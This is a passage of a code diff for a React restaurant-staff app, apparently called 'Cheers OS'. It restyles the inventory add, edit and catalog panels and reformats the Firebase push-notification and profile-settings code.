+            <div className="p-4 bg-slate-50 dark:bg-slate-900 border-t dark:border-slate-700 flex flex-col sm:flex-row justify-between items-center gap-4"><div className="text-left w-full sm:w-auto"><span className="block text-[10px] font-bold text-slate-400 uppercase tracking-widest mb-0.5">PFG Total</span><span className="font-black text-xl dark:text-white">${getFinalOrderList('PFG').reduce((s,i)=>s+(i.price*i.orderQty),0).toFixed(2)}</span></div><div className="flex flex-col sm:flex-row gap-2 w-full sm:w-auto"><button onClick={()=>handleReviewOrder('Badger')} className="bg-slate-900 text-white px-6 py-2.5 rounded-xl font-bold flex items-center justify-center gap-2"><MessageSquare size={16}/> Text Badger</button><button onClick={()=>handleReviewOrder('PFG')} className="bg-blue-600 text-white px-6 py-2.5 rounded-xl font-bold flex items-center justify-center gap-2"><Send size={16}/> Email PFG</button></div></div>
           </div>
         </div>
       )}
       {appUser?.isAdmin && invTab === 'manage' && (
         <div className="max-w-2xl mx-auto space-y-6">
           <Modal isOpen={!!editItem} onClose={() => setEditItem(null)} title="Edit Inventory Item">{editItem && (<form onSubmit={handleSaveEdit} className="space-y-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Name</label><input type="text" value={editItem.name} onChange={e => setEditItem({...editItem, name: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg" required /></div><div className="grid grid-cols-2 gap-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Category</label><select value={editItem.category} onChange={e => setEditItem({...editItem, category: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg"><option>Meat</option><option>Produce</option><option>Dairy</option><option>Seafood</option><option>Dry Goods</option><option>Liquor/Beer</option><option>Supplies</option><option>Frozen</option><option>Bakery</option></select></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Supplier</label><select value={editItem.supplier || 'PFG'} onChange={e => setEditItem({...editItem, supplier: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg"><option value="PFG">PFG</option><option value="Badger">Badger</option></select></div></div><div className="grid grid-cols-2 gap-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Pack Size</label><input type="text" value={editItem.packSize || ''} onChange={e => setEditItem({...editItem, packSize: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg" /></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Price ($)</label><input type="number" step="0.01" value={editItem.price || ''} onChange={e => setEditItem({...editItem, price: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg" /></div></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Item Code</label><input type="text" value={editItem.pfgCode || ''} onChange={e => setEditItem({...editItem, pfgCode: e.target.value})} className="w-full p-2 border dark:border-slate-600 dark:bg-slate-700 dark:text-white rounded-lg" /></div><button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-xl font-bold">Save Changes</button></form>)}</Modal>
-          <div className="bg-white dark:bg-slate-800 p-6 border dark:border-slate-700 rounded-3xl shadow-sm"><h3 className="text-xl font-black border-b dark:border-slate-700 pb-3 mb-4 dark:text-white">Add Single Item</h3><form onSubmit={handleAddItem} className="space-y-4"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Name</label><input type="text" value={newItemName} onChange={e => setNewItemName(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:text-white" required /></div><div className="grid grid-cols-2 gap-4"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Category</label><select value={newItemCat} onChange={e => setNewItemCat(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:bg-slate-700 dark:text-white font-bold"><option>Meat</option><option>Produce</option><option>Dairy</option><option>Seafood</option><option>Dry Goods</option><option>Liquor/Beer</option><option>Supplies</option><option>Frozen</option><option>Bakery</option></select></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Supplier</label><select value={newItemSupplier} onChange={e => setNewItemSupplier(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:bg-slate-700 dark:text-white font-bold"><option value="PFG">PFG</option><option value="Badger">Badger</option></select></div></div><div className="grid grid-cols-2 gap-4"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Pack Size</label><input type="text" value={newItemPackSize} onChange={e => setNewItemPackSize(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:text-white" /></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Price ($)</label><input type="number" step="0.01" value={newItemPrice} onChange={e => setNewItemPrice(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:text-white" /></div></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Item Code</label><input type="text" value={newItemCode} onChange={e => setNewItemCode(e.target.value)} className="w-full p-3 border dark:border-slate-600 rounded-xl bg-transparent dark:text-white" /></div><button type="submit" className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-black shadow-sm">Add Item</button></form></div>
-          <div className="bg-white dark:bg-slate-800 p-6 border dark:border-slate-700 rounded-3xl shadow-sm"><h3 className="text-xl font-black border-b dark:border-slate-700 pb-3 mb-4 dark:text-white">Current Master Catalog</h3><div className="space-y-1.5 max-h-[400px] overflow-y-auto custom-scrollbar pr-2">{inventoryItems.map(item => (<div key={item.id} className="flex justify-between items-center p-3 hover:bg-slate-50 dark:hover:bg-slate-700/50 rounded-xl border border-transparent transition-all"><div><span className="font-bold text-slate-800 dark:text-white block text-sm leading-tight">{item.name}</span><span className="text-[9px] font-bold text-slate-400 bg-slate-100 dark:bg-slate-700 px-2 py-1 rounded-md mt-1 inline-block uppercase tracking-wider">{item.category} • {item.packSize || '1 CS'}</span></div><div className="flex gap-2 items-center"><button onClick={() => toggleStar(item)} className={`p-2 rounded-lg transition-colors ${item.isStarred ? 'text-yellow-400 bg-yellow-50 dark:bg-yellow-900/20' : 'text-slate-300 hover:bg-slate-50 dark:hover:bg-slate-700'}`}>{item.isStarred ? '⭐' : '☆'}</button><button onClick={() => setEditItem(item)} className="text-slate-400 hover:text-indigo-500 p-2 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700"><Edit size={18}/></button><button onClick={() => deleteDoc(doc(db, "inventoryItems", item.id))} className="text-slate-400 hover:text-red-500 p-2 rounded-lg hover:bg-slate-50 dark:hover:bg-slate-700"><Trash2 size={18}/></button></div></div>))}</div></div>
+          <div className="bg-white dark:bg-slate-800 p-5 border dark:border-slate-700 rounded-2xl shadow-sm"><h3 className="text-lg font-bold border-b dark:border-slate-700 pb-2 mb-3 dark:text-white">Add Single Item</h3><form onSubmit={handleAddItem} className="space-y-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Name</label><input type="text" value={newItemName} onChange={e => setNewItemName(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:text-white" required /></div><div className="grid grid-cols-2 gap-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Category</label><select value={newItemCat} onChange={e => setNewItemCat(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:bg-slate-700 dark:text-white"><option>Meat</option><option>Produce</option><option>Dairy</option><option>Seafood</option><option>Dry Goods</option><option>Liquor/Beer</option><option>Supplies</option><option>Frozen</option><option>Bakery</option></select></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Supplier</label><select value={newItemSupplier} onChange={e => setNewItemSupplier(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:bg-slate-700 dark:text-white"><option value="PFG">PFG</option><option value="Badger">Badger</option></select></div></div><div className="grid grid-cols-2 gap-3"><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Pack Size</label><input type="text" value={newItemPackSize} onChange={e => setNewItemPackSize(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:text-white" /></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Price ($)</label><input type="number" step="0.01" value={newItemPrice} onChange={e => setNewItemPrice(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:text-white" /></div></div><div><label className="block text-[10px] font-bold text-slate-500 uppercase">Item Code</label><input type="text" value={newItemCode} onChange={e => setNewItemCode(e.target.value)} className="w-full p-2 border dark:border-slate-600 rounded-lg bg-transparent dark:text-white" /></div><button type="submit" className="w-full bg-blue-600 text-white p-3 rounded-xl font-bold">Add Item</button></form></div>
+          <div className="bg-white dark:bg-slate-800 p-5 border dark:border-slate-700 rounded-2xl shadow-sm"><h3 className="text-lg font-bold border-b dark:border-slate-700 pb-2 mb-3 dark:text-white">Current Master Catalog</h3><div className="space-y-1.5 max-h-[400px] overflow-y-auto custom-scrollbar pr-2">{inventoryItems.map(item => (<div key={item.id} className="flex justify-between items-center p-2 hover:bg-slate-50 dark:hover:bg-slate-700/50 rounded-lg border border-transparent transition-all"><div><span className="font-bold text-slate-800 dark:text-white block text-sm leading-tight">{item.name}</span><span className="text-[9px] font-bold text-slate-400 bg-slate-100 dark:bg-slate-700 px-1.5 py-0.5 rounded mt-0.5 inline-block uppercase">{item.category} • {item.packSize || '1 CS'}</span></div><div className="flex gap-1 items-center"><button onClick={() => toggleStar(item)} className={`p-1.5 rounded-md transition-colors ${item.isStarred ? 'text-yellow-400' : 'text-slate-300'}`}>{item.isStarred ? '⭐' : '☆'}</button><button onClick={() => setEditItem(item)} className="text-slate-400 hover:text-indigo-500 p-1.5 rounded-md"><Edit size={16}/></button><button onClick={() => deleteDoc(doc(db, "inventoryItems", item.id))} className="text-slate-400 hover:text-red-500 p-1.5 rounded-md"><Trash2 size={16}/></button></div></div>))}</div></div>
         </div>
       )}
     </div>
@@ -1084,10 +951,18 @@ const TabSettings = ({ addToast, appUser }) => {
   const testPush = async () => {
     if (!appUser.fcmToken) return addToast('Error', 'Enable notifications first.');
     addToast('Sending...', 'Triggering test notification.');
+    
     try {
+      // Bypasses the missing backend to trigger a direct system notification
       const registration = await navigator.serviceWorker.ready;
-      registration.showNotification("Cheers OS", { body: "Loud and clear! Push notifications are locked and loaded.", icon: "/app-icon.png" });
-    } catch(e) { console.error(e); addToast('Error', 'Failed to trigger local push.'); }
+      registration.showNotification("Cheers OS", {
+        body: "Loud and clear! Push notifications are locked and loaded.",
+        icon: "/app-icon.png"
+      });
+    } catch(e) { 
+      console.error(e); 
+      addToast('Error', 'Failed to trigger local push.');
+    }
   };
 
   const handleEnablePush = async () => {
@@ -1095,12 +970,29 @@ const TabSettings = ({ addToast, appUser }) => {
     try {
       const p = await Notification.requestPermission(); 
       if(p !== 'granted') return addToast('Denied', 'Notifications blocked.');
+      
       addToast('Connecting...', 'Activating secure worker...');
       const registration = await navigator.serviceWorker.register('/firebase-messaging-sw.js');
-      let attempts = 0; while (!registration.active && attempts < 20) { await new Promise(r => setTimeout(r, 200)); attempts++; }
-      const token = await getToken(messaging, { vapidKey: 'BJzM9xVnkPwLB6aq588ZHhekjqI_Z-xpInDquX_nknrDhew8ytFZbCA22uFN4iSKP_YvGV0sPH9M6aBzGCA9AcU', serviceWorkerRegistration: registration });
-      if(token) { await updateDoc(doc(db, "users", appUser.id), { fcmToken: token }); addToast('Success', 'Push enabled.'); }
-    } catch(e) { addToast('Error', e.message); console.error(e); }
+      
+      let attempts = 0; 
+      while (!registration.active && attempts < 20) { 
+        await new Promise(r => setTimeout(r, 200)); 
+        attempts++; 
+      }
+      
+      const token = await getToken(messaging, { 
+        vapidKey: 'BJzM9xVnkPwLB6aq588ZHhekjqI_Z-xpInDquX_nknrDhew8ytFZbCA22uFN4iSKP_YvGV0sPH9M6aBzGCA9AcU', 
+        serviceWorkerRegistration: registration 
+      });
+      
+      if(token) { 
+        await updateDoc(doc(db, "users", appUser.id), { fcmToken: token }); 
+        addToast('Success', 'Push enabled.'); 
+      }
+    } catch(e) { 
+      addToast('Error', e.message); 
+      console.error(e);
+    }
   };
 
   const handlePhotoUpload = (e) => {
@@ -1125,30 +1017,33 @@ const TabSettings = ({ addToast, appUser }) => {
     <div className="max-w-2xl mx-auto space-y-6">
       <div className="bg-white dark:bg-slate-800 border dark:border-slate-700 rounded-3xl p-6 shadow-sm space-y-6">
         <h3 className="text-xl font-black dark:text-white mb-2">My Profile & Settings</h3>
+        
         <div className="space-y-3">
-          <div className="bg-slate-50 dark:bg-slate-700/50 p-4 rounded-2xl border dark:border-slate-600 flex justify-between items-center">
+          <div className="bg-slate-50 dark:bg-slate-700/50 p-4 rounded-xl border dark:border-slate-600 flex justify-between items-center">
              <div><h4 className="font-bold text-sm dark:text-slate-200">Profile Picture</h4><p className="text-xs text-slate-500 dark:text-slate-400">Upload a custom avatar</p></div>
-             <label className="bg-white dark:bg-slate-800 border dark:border-slate-600 px-4 py-2 rounded-xl font-bold text-xs cursor-pointer hover:bg-slate-100 transition-colors shadow-sm dark:text-white">Upload Image<input type="file" accept="image/*" className="hidden" onChange={handlePhotoUpload} /></label>
+             <label className="bg-white dark:bg-slate-800 border dark:border-slate-600 px-4 py-2 rounded-lg font-bold text-xs cursor-pointer hover:bg-slate-100 transition-colors shadow-sm dark:text-white">Upload Image<input type="file" accept="image/*" className="hidden" onChange={handlePhotoUpload} /></label>
           </div>
-          <div className="bg-slate-50 dark:bg-slate-700/50 p-4 rounded-2xl border dark:border-slate-600 space-y-3">
+
+          <div className="bg-slate-50 dark:bg-slate-700/50 p-4 rounded-xl border dark:border-slate-600 space-y-3">
              <div className="flex justify-between items-center cursor-pointer" onClick={toggleReminder}>
                <div><h4 className="font-bold text-sm dark:text-slate-200">Shift Reminders</h4><p className="text-xs text-slate-500 dark:text-slate-400">Alert me before my shifts</p></div>
-               <div className={`w-10 h-5 rounded-full flex items-center px-1 transition-colors ${appUser.shiftRemindersEnabled?'bg-blue-600':'bg-slate-300 dark:bg-slate-600'}`}><div className={`w-3.5 h-3.5 bg-white rounded-full shadow-sm transition-transform ${appUser.shiftRemindersEnabled?'translate-x-4':'translate-x-0'}`}></div></div>
+               <div className={`w-10 h-5 rounded-full flex items-center px-1 ${appUser.shiftRemindersEnabled?'bg-blue-600':'bg-slate-300 dark:bg-slate-600'}`}><div className={`w-3.5 h-3.5 bg-white rounded-full shadow-sm transition-transform ${appUser.shiftRemindersEnabled?'translate-x-4':'translate-x-0'}`}></div></div>
              </div>
              {appUser.shiftRemindersEnabled && (
                <div className="flex items-center justify-between border-t dark:border-slate-600 pt-3">
                   <span className="text-xs font-bold text-slate-500 dark:text-slate-400">Hours before shift:</span>
-                  <input type="number" min="1" max="72" value={appUser.reminderLeadTime || 24} onChange={(e) => updateLeadTime(e.target.value)} className="w-16 p-1.5 bg-white dark:bg-slate-800 border dark:border-slate-600 rounded-xl text-center font-bold text-sm outline-none dark:text-white shadow-sm" />
+                  <input type="number" min="1" max="72" value={appUser.reminderLeadTime || 24} onChange={(e) => updateLeadTime(e.target.value)} className="w-16 p-1.5 bg-white dark:bg-slate-800 border dark:border-slate-600 rounded-lg text-center font-bold text-sm outline-none dark:text-white shadow-sm" />
                </div>
              )}
           </div>
         </div>
-        <div className="bg-blue-50 dark:bg-blue-900/20 p-5 rounded-3xl border border-blue-100 dark:border-blue-800">
+
+        <div className="bg-blue-50 dark:bg-blue-900/20 p-5 rounded-2xl border border-blue-100 dark:border-blue-800">
            <h4 className="font-black text-blue-900 dark:text-blue-400 mb-1">Device Push Notifications</h4>
-           <p className="text-xs text-blue-800 dark:text-blue-300 mb-4 font-bold">Link this device to receive alerts.</p>
+           <p className="text-xs text-blue-800 dark:text-blue-300 mb-4 font-medium">Link this device to receive alerts.</p>
            <div className="flex gap-2">
-             <button onClick={handleEnablePush} className="bg-blue-600 text-white px-4 py-3 rounded-xl font-black flex-1 text-sm hover:bg-blue-700 shadow-sm transition-colors">Enable Alerts</button>
-             {appUser.fcmToken && <button onClick={testPush} className="bg-slate-900 dark:bg-slate-700 text-white px-4 py-3 rounded-xl font-black flex-1 text-sm shadow-sm hover:bg-slate-800 transition-colors">Test Push</button>}
+             <button onClick={handleEnablePush} className="bg-blue-600 text-white px-4 py-2.5 rounded-xl font-bold flex-1 text-sm hover:bg-blue-700 shadow-sm">Enable Alerts</button>
+             {appUser.fcmToken && <button onClick={testPush} className="bg-slate-900 dark:bg-slate-700 text-white px-4 py-2.5 rounded-xl font-bold flex-1 text-sm shadow-sm hover:bg-slate-800">Test Push</button>}
            </div>
         </div>
       </div>
